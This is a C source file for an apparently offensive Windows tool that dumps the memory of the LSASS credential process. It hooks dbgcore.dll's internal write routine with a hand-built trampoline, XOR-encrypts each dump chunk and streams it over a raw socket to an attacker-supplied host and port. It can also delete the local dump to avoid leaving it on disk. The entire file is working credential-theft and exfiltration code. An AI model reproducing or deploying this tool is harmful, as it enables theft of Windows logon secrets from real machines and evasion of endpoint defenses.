#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include "covert.h"
#include "conf.h"
#include "utils.h"
#include <Windows.h>
#include <stdio.h>
#include <DbgHelp.h>

#pragma comment (lib, "Dbghelp.lib")

intptr_t writeAll_abs;
HANDLE hProcess;
HANDLE our_dmp_handle;
SOCKET s;

char overwritten_writeAll[13];

char trampoline_assembly[13] = {
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, NEW_LOC_@ddress
    0x41, 0xFF, 0xE2                                                    // jmp r10
};



void minidumpThis(HANDLE hProc)
{
    our_dmp_handle = CreateFileA(EXPORT_PATH, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!our_dmp_handle)
    {
        printf("No dump for you. Wrong file\n");
    }
    else
    {
        DWORD lsassPid = GetProcessId(hProc);
        printf("Got PID:: %i\n", lsassPid);
        BOOL Result = MiniDumpWriteDump(hProc, lsassPid, our_dmp_handle, MiniDumpWithFullMemory, NULL, NULL, NULL);
        CloseHandle(our_dmp_handle);

        if (!Result)
        {
            printf("No dump for you. Minidump failed\n");
        }
    }

    return;
}


unsigned char* hoot(void* buffer, INT64 size, long pos) {
    unsigned char* new_buff = (unsigned char*) buffer;

    if (USE_ENCRYPTION) {
        new_buff = encrypt(buffer, size, XOR_KEY);
    }
  
    if (EXFIL) {
        s = getRawSocket(EXFIL_HOST, EXFIL_PORT);
        if(s) {
            sendBytesRaw(s, (const char*)new_buff, size, pos);
        }
        else {
            printf("[!] ERR:: SOCKET NOT READY\n");
         }
    }

    if (!WRITE_TO_FILE) {
        memset(new_buff, 0x00, size);
    }
   
    return new_buff;
}

UINT32 _hoot_trampoline(HANDLE file_handler, void* buffer, INT64 size) {
    WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &overwritten_writeAll, sizeof(overwritten_writeAll), NULL);

    long high_dword = NULL;
    DWORD low_dword = SetFilePointer(our_dmp_handle, NULL, &high_dword, FILE_CURRENT);
    long pos = high_dword << 32 | low_dword;

    unsigned char* new_buff = hoot(buffer, size, pos);

    UINT32 ret = ((UINT32(*)(HANDLE, void*, INT64))(writeAll_abs))(file_handler, (void*)new_buff, size);      // erg...
    WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &trampoline_assembly, sizeof(trampoline_assembly), NULL);

    return ret;
}


bool parse_args(int argc, char* args[]) {
    bool success = false;
    if (argc > 2) {
        LSASS_PID = atoi(args[1]);
        WRITE_TO_FILE = atoi(args[2]);
        EXFIL = atoi(args[3]);
        if (USE_ENCRYPTION) {
            printf("XOR-Encrypting with 0x%x\n", XOR_KEY);
        }
        if (EXFIL) {
            printf("Attempting to exfil dump..");
            EXFIL_HOST = args[4];
            EXFIL_PORT = atoi(args[5]);
        }

        if (WRITE_TO_FILE) {
            EXPORT_PATH = args[6];
            printf("Exporting dump to %s\n", EXPORT_PATH);
        }
        else
            EXPORT_PATH = "C:\\temp.dmp";
        success = true;
    }
    else {
        printf("[!] ERR:: Incorrect args number.\nEx: minidump.exe <LSASS_PID> <WRITE_TO_FILE 0|1> <EXFIL 0|1> [<HOST> <PORT>] [<EXPORT_PATH>]\n\tminidump.exe 696 1 '192.168.1.10' 1234");
    }

    return success;
}



int main(int argc, char* args[])
{

    if (!IsElevated()) {
        printf("not admin\n");
        return -1;
    }
    if (!SetDebugPrivilege()) {
        printf("no SeDebugPrivs\n");
        return -1;
    }

    if (!parse_args(argc, args))
        return -1;

      
    
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());


    const char* dbgcore_name = "dbgcore.dll";
    intptr_t dbgcore_handle = (intptr_t)LoadLibraryA(dbgcore_name);
    printf("dbgcore@%I64X\n", dbgcore_handle);


    intptr_t writeAll_offset = 0xb4b0;
    writeAll_abs = dbgcore_handle + writeAll_offset;

    void* _hoot_trampoline_address = (void*)_hoot_trampoline;
    memcpy(&trampoline_assembly[2], &_hoot_trampoline_address, sizeof(_hoot_trampoline_address));

    printf("writeAll@%I64X\n", (LPVOID*)writeAll_abs);
    printf("_hoot_trampoline@%I64X\n", _hoot_trampoline);

    memcpy(overwritten_writeAll, (void*)writeAll_abs, sizeof(overwritten_writeAll));
    WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &trampoline_assembly, sizeof(trampoline_assembly), NULL);


    HANDLE lsassProcess_handle = NULL;

    lsassProcess_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, LSASS_PID);
    minidumpThis(lsassProcess_handle);
    CloseHandle(lsassProcess_handle);

    if (s)
        closeSocket();
    if (!WRITE_TO_FILE)
        remove(EXPORT_PATH);

	return 0;
}
